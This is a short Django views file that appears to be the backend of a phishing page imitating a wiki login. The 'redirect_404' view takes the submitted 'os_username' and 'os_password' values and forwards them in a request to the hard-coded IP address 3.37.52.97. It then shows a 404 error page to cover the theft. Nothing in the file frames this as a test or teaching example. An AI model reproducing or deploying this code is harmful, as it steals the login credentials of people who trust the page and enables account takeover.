from django.http import HttpResponse
from django.shortcuts import render
import requests

# Create your views here.

def hello_world(request):
    return render(request, 'accountapp/wiki.html')

def redirect_404(request):    
    if request.method == "POST":
        temp = request.POST.get('os_username')    
        temp2 = request.POST.get('os_password')

        params = {
            'key1': temp,
            'key2': temp2,
        }
        response = requests.get('http://3.37.52.97', params=params )

        context = {            
            'remote_response': response.text,
        }
        return render(request, 'accountapp/404.html', context)
    else:         
        temp = request.GET.get('os_username')    
        temp2 = request.GET.get('os_password')

        return render(request, 'accountapp/404.html', context={'text': temp, 'text2': temp2})
    